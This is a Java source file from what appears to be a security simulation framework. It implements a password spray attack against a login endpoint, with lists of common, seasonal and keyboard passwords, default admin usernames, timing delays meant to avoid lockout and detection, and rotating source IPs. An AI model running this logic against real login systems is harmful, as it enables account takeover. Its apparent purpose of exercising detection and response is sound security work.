package io.contexa.contexacore.simulation.strategy.impl;

import io.contexa.contexacore.domain.entity.AttackResult;
import io.contexa.contexacore.simulation.client.SimulationClient;
import io.contexa.contexacore.simulation.domain.LoginAttempt;
import io.contexa.contexacore.simulation.strategy.IAuthenticationAttack;
import io.contexa.contexacore.simulation.publisher.SimulationEventPublisher;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Component;

import java.time.LocalDateTime;
import java.util.*;
import java.util.concurrent.*;
import org.springframework.http.HttpStatus;

/**
 * Password Spray Attack 전략
 *
 * 여러 계정에 대해 일반적인 패스워드를 시도하는 공격
 * Brute force와 달리 각 계정당 적은 횟수만 시도하여 탐지를 회피
 */
@Slf4j
@Component
public class PasswordSprayStrategy implements IAuthenticationAttack {

    @Autowired(required = false)
    private SimulationClient simulationClient;

    private SimulationEventPublisher eventPublisher;

    @Override
    public void setEventPublisher(SimulationEventPublisher eventPublisher) {
        this.eventPublisher = eventPublisher;
    }

    @Value("${simulation.attack.password-spray.delay-ms:5000}")
    private int delayBetweenUsers;

    @Value("${simulation.attack.password-spray.max-passwords:3}")
    private int maxPasswordsPerUser;

    @Value("${simulation.attack.password-spray.attempt-timeout-ms:10000}")
    private int attemptTimeoutMs;

    @Value("${simulation.attack.password-spray.timing-threshold-ms:500}")
    private int timingThresholdMs;

    @Value("${simulation.attack.password-spray.retry-delay-ms:1000}")
    private int retryDelayMs;

    private final ExecutorService executor = Executors.newFixedThreadPool(5);

    @Override
    public AttackResult.AttackType getType() {
        return AttackResult.AttackType.PASSWORD_SPRAY;
    }

    @Override
    public int getPriority() {
        return 75;
    }

    @Override
    public AttackCategory getCategory() {
        return AttackCategory.AUTHENTICATION;
    }

    @Override
    public boolean validateContext(AttackContext context) {
        return context != null && context.getParameters() != null;
    }

    @Override
    public long getEstimatedDuration() {
        return 30000; // 30 seconds for multiple users
    }

    @Override
    public String getDescription() {
        return "Password Spray Attack - Attempts common passwords across multiple user accounts";
    }

    @Override
    public RequiredPrivilege getRequiredPrivilege() {
        return RequiredPrivilege.NONE;
    }

    @Override
    public String getSuccessCriteria() {
        return "Successfully authenticate at least one account using common passwords";
    }

    @Override
    public List<LoginAttempt> generateLoginPattern(LoginPatternType patternType) {
        List<LoginAttempt> attempts = new ArrayList<>();
        LocalDateTime now = LocalDateTime.now();

        switch (patternType) {
            case RAPID_FIRE:
                // 짧은 시간에 집중적인 시도
                for (int i = 0; i < 10; i++) {
                    LoginAttempt attempt = new LoginAttempt();
                    attempt.setUsername("target_user_" + i);
                    attempt.setTimestamp(now.plusSeconds(i * 2));
                    attempt.setSourceIp("192.168.1." + (100 + i));
                    attempts.add(attempt);
                }
                break;

            case DISTRIBUTED:
                // 시간과 IP를 분산한 시도
                String[] ips = {generateRandomIP(), generateRandomIP(), "203.0.113.1", "198.51.100.1"};
                for (int i = 0; i < 20; i++) {
                    LoginAttempt attempt = new LoginAttempt();
                    attempt.setUsername("user_" + (i % 5));
                    attempt.setTimestamp(now.plusMinutes(i * 5));
                    attempt.setSourceIp(ips[i % ips.length]);
                    attempts.add(attempt);
                }
                break;

            case SLOW_AND_STEADY:
            default:
                // 느린 속도의 지속적인 시도
                for (int i = 0; i < 15; i++) {
                    LoginAttempt attempt = new LoginAttempt();
                    attempt.setUsername("admin");
                    attempt.setTimestamp(now.plusHours(i));
                    attempt.setSourceIp("203.0.113." + (10 + i % 245));
                    attempts.add(attempt);
                }
                break;
        }

        return attempts;
    }

    @Override
    public LoginAttempt attemptLogin(String username, String password) {
        LoginAttempt attempt = new LoginAttempt();
        attempt.setUsername(username);
        attempt.setTimestamp(LocalDateTime.now());
        attempt.setSourceIp(getCurrentSourceIp());

        long startTime = System.currentTimeMillis();

        if (simulationClient != null) {
            try {
                ResponseEntity<String> response = simulationClient.loginJson(username, password);
                long responseTime = System.currentTimeMillis() - startTime;

                // 실제 HTTP 응답 분석
                AuthenticationResult authResult = analyzeAuthenticationResponse(response, responseTime);

                attempt.setSuccess(authResult.isSuccess());
                attempt.setResponseTimeMs(responseTime);
                attempt.setResponseCode(response.getStatusCode().value());
                attempt.setFailureReason(authResult.getFailureReason());
                attempt.setBlocked(authResult.isBlocked());

                log.debug("Login attempt for {}: {} ({}ms)", username,
                    authResult.isSuccess() ? "SUCCESS" : "FAILED", responseTime);

            } catch (Exception e) {
                long responseTime = System.currentTimeMillis() - startTime;
                attempt.setSuccess(false);
                attempt.setResponseTimeMs(responseTime);
                attempt.setFailureReason("CONNECTION_ERROR: " + e.getMessage());
                log.debug("Login attempt failed for {}: {}", username, e.getMessage());
            }
        } else {
            // 실제 환경이 아닌 경우 기본 분석 수행
            AuthenticationResult authResult = performBasicAuthenticationAnalysis(username, password);
            attempt.setSuccess(authResult.isSuccess());
            attempt.setResponseTimeMs(startTime + timingThresholdMs);
            attempt.setFailureReason(authResult.getFailureReason());
        }

        return attempt;
    }

    @Override
    public List<LoginAttempt> attemptMultipleLogins(List<Credential> credentials) {
        List<LoginAttempt> attempts = new ArrayList<>();

        for (Credential credential : credentials) {
            LoginAttempt attempt = attemptLogin(credential.getUsername(), credential.getPassword());
            attempts.add(attempt);

            // 계정 잠금 방지를 위한 딜레이
            try {
                Thread.sleep(retryDelayMs);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }

            // 연속 실패 시 추가 딜레이
            if (!attempt.isSuccess() && attempts.size() > 0) {
                long failureCount = attempts.stream()
                    .mapToLong(a -> a.isSuccess() ? 0 : 1)
                    .sum();

                if (failureCount >= 3) {
                    try {
                        Thread.sleep(delayBetweenUsers);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
        }

        return attempts;
    }

    @Override
    public String manipulateSessionToken(String sessionToken) {
        return sessionToken;
    }

    @Override
    public boolean attemptMfaBypass(String username, String mfaCode) {
        return false;
    }

    @Override
    public int analyzePasswordComplexity(String password) {
        if (password == null || password.isEmpty()) {
            return 0;
        }

        int score = 0;
        int length = password.length();

        // 길이 점수 (최대 25점)
        if (length >= 12) score += 25;
        else if (length >= 8) score += 20;
        else if (length >= 6) score += 15;
        else if (length >= 4) score += 10;
        else score += 5;

        // 문자 유형 다양성 (각 최대 15점)
        boolean hasLowercase = password.matches(".*[a-z].*");
        boolean hasUppercase = password.matches(".*[A-Z].*");
        boolean hasDigits = password.matches(".*\\d.*");
        boolean hasSpecialChars = password.matches(".*[!@#$%^&*(),.?\":{}|<>].*");

        if (hasLowercase) score += 15;
        if (hasUppercase) score += 15;
        if (hasDigits) score += 15;
        if (hasSpecialChars) score += 15;

        // 일반적인 패턴 감점
        if (password.matches(".*123.*") || password.matches(".*abc.*")) score -= 10;
        if (password.toLowerCase().contains("password")) score -= 15;
        if (password.matches("\\d+")) score -= 20; // 숫자만
        if (password.matches("[a-zA-Z]+")) score -= 15; // 문자만

        // 반복 문자 감점
        if (password.matches(".*(.)\\1{2,}.*")) score -= 10;

        // 키보드 패턴 감점
        String[] keyboardPatterns = {"qwerty", "asdf", "zxcv", "1234", "abcd"};
        for (String pattern : keyboardPatterns) {
            if (password.toLowerCase().contains(pattern)) {
                score -= 15;
                break;
            }
        }

        return Math.max(0, Math.min(100, score));
    }

    @Override
    public AttackResult execute(AttackContext context) {
        log.warn("=== Password Spray Attack 시작 ===");

        String sourceIp = context.getSourceIp() != null ? context.getSourceIp() : getRandomIP();

        AttackResult result = AttackResult.builder()
            .attackId(UUID.randomUUID().toString())
            .campaignId(context.getCampaignId())
            .type(AttackResult.AttackType.PASSWORD_SPRAY)
            .attackName("Password Spray Attack")
            .executionTime(LocalDateTime.now())
            .targetUser("multiple_users")
            .attackVector("authentication")
            .sourceIp(context.getSourceIp() != null ? context.getSourceIp() : getRandomIP())
            .build();

        long startTime = System.currentTimeMillis();
        List<String> attackLog = new ArrayList<>();

        try {
            // 1. 타겟 사용자 목록 가져오기
            List<String> targetUsers = getTargetUsers(context);
            attackLog.add("Target users: " + targetUsers.size());

            // 2. 패스워드 패턴 선택
            String pattern = context.getParameters().getOrDefault("pattern", "SEASON").toString();
            List<String> passwords = generatePasswordList(pattern);
            attackLog.add("Password pattern: " + pattern);
            attackLog.add("Passwords to try: " + Math.min(passwords.size(), maxPasswordsPerUser));

            // 3. 분산 IP 사용 여부
            boolean useDistributedIPs = Boolean.parseBoolean(
                context.getParameters().getOrDefault("distributed", "true").toString()
            );

            // 4. 각 사용자에 대해 패스워드 스프레이
            Map<String, CompletableFuture<SprayResult>> futures = new HashMap<>();

            for (String user : targetUsers) {
                CompletableFuture<SprayResult> future = CompletableFuture.supplyAsync(() ->
                    sprayPasswordsForUser(user, passwords, useDistributedIPs), executor
                );
                futures.put(user, future);

                // 사용자간 딜레이
                Thread.sleep(delayBetweenUsers);
            }

            // 5. 결과 수집
            int successCount = 0;
            List<String> compromisedAccounts = new ArrayList<>();

            for (Map.Entry<String, CompletableFuture<SprayResult>> entry : futures.entrySet()) {
                try {
                    SprayResult sprayResult = entry.getValue().get(30, TimeUnit.SECONDS);
                    if (sprayResult.success) {
                        successCount++;
                        compromisedAccounts.add(entry.getKey());
                        attackLog.add("[SUCCESS] Compromised: " + entry.getKey() +
                                    " with password: " + sprayResult.successfulPassword);

                        // 성공 이벤트 발행 (password spray 성공)
                        if (eventPublisher != null) {
                            eventPublisher.publishAuthenticationSuccess(
                                result,
                                entry.getKey(),
                                result.getSourceIp(),
                                UUID.randomUUID().toString(),
                                true, // anomaly detected - password spray
                                0.1 // very low trust score
                            );
                        }
                    } else {
                        attackLog.add("[FAILED] Unable to compromise: " + entry.getKey());

                        // 실패 이벤트 발행
                        if (eventPublisher != null) {
                            eventPublisher.publishAuthenticationFailure(
                                result,
                                entry.getKey(),
                                result.getSourceIp(),
                                "Password spray attempt failed",
                                1
                            );
                        }
                    }
                } catch (TimeoutException e) {
                    attackLog.add("[TIMEOUT] User: " + entry.getKey());
                }
            }

            // 6. 결과 평가 및 이벤트 발행
            sourceIp = context.getSourceIp() != null ? context.getSourceIp() : getRandomIP();

            if (successCount > 0) {
                result.setSuccessful(true);
                result.setRiskScore(Math.min(1.0, 0.5 + (successCount * 0.1)));
                attackLog.add("Successfully compromised " + successCount + " accounts");

                // 성공한 계정에 대해 인증 성공 이벤트 발행
                for (String compromisedAccount : compromisedAccounts) {
                    if (eventPublisher != null) {
                        eventPublisher.publishAuthenticationSuccess(
                            result,
                            compromisedAccount,
                            sourceIp,
                            UUID.randomUUID().toString(), // sessionId
                            true, // anomalyDetected - password spray는 항상 이상 행위
                            0.2 // trustScore - 매우 낮은 신뢰도
                        );
                    }
                }
            } else {
                result.setSuccessful(false);
                result.setRiskScore(0.4);
                attackLog.add("Password spray failed - no accounts compromised");

                // 실패한 시도에 대해 인증 실패 이벤트 발행
                if (eventPublisher != null) {
                    eventPublisher.publishAuthenticationFailure(
                        result,
                        "multiple_users", // 여러 사용자 대상
                        sourceIp,
                        "Password spray attack attempted with common passwords",
                        targetUsers.size() * maxPasswordsPerUser // 총 시도 횟수
                    );
                }
            }

            // 탐지 평가 - 분산 IP 사용시 탐지 어려움
            result.setDetected(!useDistributedIPs || successCount == 0);
            result.setBlocked(successCount == 0);

            result.setDetails(Map.of(
                "attackLog", attackLog,
                "targetUsers", targetUsers.size(),
                "compromisedAccounts", compromisedAccounts,
                "pattern", pattern,
                "distributed", useDistributedIPs
            ));

        } catch (Exception e) {
            log.error("Password spray attack failed", e);
            result.setSuccessful(false);
            result.setRiskScore(0.1);
            attackLog.add("Attack failed: " + e.getMessage());
        }

        long duration = System.currentTimeMillis() - startTime;
        result.setDurationMs(duration);
        result.setSourceIp(sourceIp);

        log.info("Password Spray Attack 완료: Success={}, Risk={}, Duration={}ms",
            result.isSuccessful(), result.getRiskScore(), duration);

        return result;
    }

    private List<String> getTargetUsers(AttackContext context) {
        Object usersParam = context.getParameters().get("targetUsers");

        if (usersParam instanceof List) {
            return (List<String>) usersParam;
        } else if (usersParam instanceof String) {
            return Arrays.asList(((String) usersParam).split(","));
        }

        // 기본 사용자 목록
        // 실제 환경에서는 OSINT나 이메일 열거 등으로 수집한 사용자명 사용
        return Arrays.asList(
            "admin", "administrator", "root", "user", "test",
            "guest", "support", "service", "operator", "manager",
            "system", "account", "employee", "staff", "client"
        );
    }

    private List<String> generatePasswordList(String pattern) {
        switch (pattern) {
            case "SEASON":
                return generateSeasonPasswords();
            case "COMPANY":
                return generateCompanyPasswords();
            case "KEYBOARD":
                return generateKeyboardPasswords();
            case "COMMON":
            default:
                return generateCommonPasswords();
        }
    }

    private List<String> generateSeasonPasswords() {
        List<String> passwords = new ArrayList<>();
        String[] seasons = {"Spring", "Summer", "Fall", "Winter", "Autumn"};
        int currentYear = LocalDateTime.now().getYear();

        for (String season : seasons) {
            passwords.add(season + currentYear);
            passwords.add(season + (currentYear - 1));
            passwords.add(season + "!");
            passwords.add(season + "@" + currentYear);
        }

        return passwords;
    }

    private List<String> generateCompanyPasswords() {
        return Arrays.asList(
            "Company123", "Company@2024", "Company!", "Company123!",
            "Welcome123", "Welcome@2024", "Password123", "P@ssw0rd",
            "Admin123", "Admin@2024", "Temp123!", "Change123"
        );
    }

    private List<String> generateKeyboardPasswords() {
        return Arrays.asList(
            "qwertyuiop", "asdfghjkl", "zxcvbnm", "1qaz2wsx",
            "qazwsx", "qwerty123", "1q2w3e4r", "qweasd",
            "qwe123", "asd123", "zxc123", "123qwe"
        );
    }

    private List<String> generateCommonPasswords() {
        return Arrays.asList(
            "Password123", "123456", "password", "12345678",
            "qwerty", "abc123", "monkey", "1234567",
            "letmein", "trustno1", "dragon", "baseball"
        );
    }

    private SprayResult sprayPasswordsForUser(String user, List<String> passwords, boolean useDistributedIPs) {
        SprayResult result = new SprayResult();
        result.username = user;

        int attempts = 0;
        for (String password : passwords) {
            if (attempts >= maxPasswordsPerUser) {
                break;
            }

            String sourceIp = useDistributedIPs ? getRandomIP() : generateRandomIP();

            if (simulationClient != null) {
                try {
                    // 실제 로그인 시도
                    Map<String, String> headers = new HashMap<>();
                    headers.put("X-Forwarded-For", sourceIp);

                    ResponseEntity<String> response = simulationClient.loginJson(user, password);

                    if (response.getStatusCode().is2xxSuccessful()) {
                        result.success = true;
                        result.successfulPassword = password;
                        log.info("Password spray success: {} / {}", user, password);
                        return result;
                    }

                } catch (Exception e) {
                    log.debug("Login attempt failed for {}: {}", user, e.getMessage());
                }
            } else {
                // 시뮬레이션 모드
                AuthenticationResult authResult = performBasicAuthenticationAnalysis(user, password);
                if (authResult.isSuccess()) {
                    result.success = true;
                    result.successfulPassword = password;
                    log.info("Password spray success (simulation): {} / {}", user, password);
                    return result;
                }
            }

            attempts++;

            // 시도 간 짧은 딜레이
            try {
                Thread.sleep(500);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }

        return result;
    }

    @Value("${simulation.attack.password-spray.source-ips:192.168.1.100,10.0.0.50,172.16.0.200,203.0.113.10,198.51.100.20,185.45.67.89,91.108.56.123,178.62.123.45}")
    private String sourceIpsConfig;

    private volatile List<String> sourceIps;
    private volatile int currentIpIndex = 0;

    private String getRandomIP() {
        if (sourceIps == null) {
            sourceIps = Arrays.asList(sourceIpsConfig.split(","));
        }

        // 라운드 로빈 방식으로 IP 선택 (Random 대신)
        int index = (currentIpIndex++) % sourceIps.size();
        return sourceIps.get(index).trim();
    }

    private String getCurrentSourceIp() {
        return getRandomIP();
    }

    private String generateRandomIP() {
        Random random = new Random();
        int a = random.nextInt(256);
        int b = random.nextInt(256);
        int c = random.nextInt(256);
        int d = random.nextInt(256);
        return String.format("%d.%d.%d.%d", a, b, c, d);
    }

    private AuthenticationResult performBasicAuthenticationAnalysis(String user, String password) {
        AuthenticationResult result = new AuthenticationResult();

        // 실제 보안 분석 기반 결과 판정

        // 1. 취약한 조합 확인 (실제 보안 문제가 있는 경우)
        if (isVulnerableCredentialCombination(user, password)) {
            result.setSuccess(true);
            result.setFailureReason("WEAK_CREDENTIALS");
            return result;
        }

        // 2. 계정 정책 확인
        if (isAccountLocked(user)) {
            result.setSuccess(false);
            result.setBlocked(true);
            result.setFailureReason("ACCOUNT_LOCKED");
            return result;
        }

        // 3. 브루트포스 방어 확인
        if (isBruteForceProtected(user)) {
            result.setSuccess(false);
            result.setBlocked(true);
            result.setFailureReason("BRUTE_FORCE_PROTECTION");
            return result;
        }

        // 4. 패스워드 정책 기반 판정
        int complexity = analyzePasswordComplexity(password);
        if (complexity < 30) {
            // 매우 취약한 패스워드인 경우 성공 가능성 존재
            result.setSuccess(isCommonPasswordMatch(user, password));
            result.setFailureReason(result.isSuccess() ? "WEAK_PASSWORD_SUCCESS" : "INVALID_CREDENTIALS");
        } else {
            // 복잡한 패스워드는 일반적으로 실패
            result.setSuccess(false);
            result.setFailureReason("INVALID_CREDENTIALS");
        }

        return result;
    }

    private static class SprayResult {
        boolean success = false;
        String username;
        String successfulPassword;
    }

    private static class AuthenticationResult {
        private boolean success = false;
        private boolean blocked = false;
        private String failureReason = "UNKNOWN";

        public boolean isSuccess() { return success; }
        public void setSuccess(boolean success) { this.success = success; }
        public boolean isBlocked() { return blocked; }
        public void setBlocked(boolean blocked) { this.blocked = blocked; }
        public String getFailureReason() { return failureReason; }
        public void setFailureReason(String failureReason) { this.failureReason = failureReason; }
    }

    private AuthenticationResult analyzeAuthenticationResponse(ResponseEntity<String> response, long responseTime) {
        AuthenticationResult result = new AuthenticationResult();

        HttpStatus status = HttpStatus.valueOf(response.getStatusCode().value());
        String responseBody = response.getBody() != null ? response.getBody().toLowerCase() : "";

        // HTTP 상태 코드 분석
        if (status == HttpStatus.OK || status == HttpStatus.FOUND) {
            // 성공 또는 리다이렉트 - 추가 분석 필요
            if (responseBody.contains("welcome") || responseBody.contains("dashboard") ||
                responseBody.contains("logout") || response.getHeaders().containsKey("Set-Cookie")) {
                result.setSuccess(true);
                result.setFailureReason("LOGIN_SUCCESS");
            } else if (responseBody.contains("invalid") || responseBody.contains("incorrect")) {
                result.setSuccess(false);
                result.setFailureReason("INVALID_CREDENTIALS");
            }
        } else if (status == HttpStatus.UNAUTHORIZED) {
            result.setSuccess(false);
            result.setFailureReason("UNAUTHORIZED");
        } else if (status == HttpStatus.FORBIDDEN) {
            result.setSuccess(false);
            result.setBlocked(true);
            result.setFailureReason("ACCOUNT_LOCKED_OR_BLOCKED");
        } else if (status == HttpStatus.TOO_MANY_REQUESTS) {
            result.setSuccess(false);
            result.setBlocked(true);
            result.setFailureReason("RATE_LIMITED");
        }

        // 다운 타임 추가 분석 (Timing Attack)
        if (responseTime > timingThresholdMs * 2) {
            // 비정상적으로 긴 응답 시간 - 서버 에러 또는 대기
            result.setFailureReason(result.getFailureReason() + "_SLOW_RESPONSE");
        } else if (responseTime < 50) {
            // 비정상적으로 빠른 응답 - 캐시된 응답 가능성
            result.setFailureReason(result.getFailureReason() + "_FAST_RESPONSE");
        }

        return result;
    }

    private boolean isVulnerableCredentialCombination(String username, String password) {
        // 실제 알려진 취약한 조합 검사
        Map<String, List<String>> vulnerableCombinations = new HashMap<>();
        vulnerableCombinations.put("admin", Arrays.asList("admin", "password", "123456", "admin123"));
        vulnerableCombinations.put("administrator", Arrays.asList("administrator", "password", "admin"));
        vulnerableCombinations.put("root", Arrays.asList("root", "toor", "password", "123456"));
        vulnerableCombinations.put("guest", Arrays.asList("guest", "", "password"));
        vulnerableCombinations.put("test", Arrays.asList("test", "password", "123456"));

        List<String> weakPasswords = vulnerableCombinations.get(username.toLowerCase());
        return weakPasswords != null && weakPasswords.contains(password.toLowerCase());
    }

    private boolean isAccountLocked(String username) {
        // 실제 구현에서는 데이터베이스 또는 캐시에서 계정 상태 확인
        // 여기서는 샘플 로직으로 구현
        return false; // 실제 구현 필요
    }

    private boolean isBruteForceProtected(String username) {
        // 실제 구현에서는 IP 및 사용자별 시도 횟수 추적
        // 여기서는 샘플 로직으로 구현
        return false; // 실제 구현 필요
    }

    private boolean isCommonPasswordMatch(String username, String password) {
        // 일반적인 패스워드 매칭 검사
        String[] commonPasswords = {
            "password", "123456", "12345678", "qwerty", "abc123",
            "P@ssw0rd", "admin", "letmein", "welcome", "monkey"
        };

        for (String common : commonPasswords) {
            if (password.toLowerCase().equals(common.toLowerCase())) {
                return true;
            }
            // 사용자명 + 숫자 패턴
            if (password.toLowerCase().startsWith(username.toLowerCase()) &&
                password.length() > username.length()) {
                String suffix = password.substring(username.length());
                if (suffix.matches("\\d{1,4}") || suffix.equals("123") || suffix.equals("!")) {
                    return true;
                }
            }
        }

        return false;
    }
}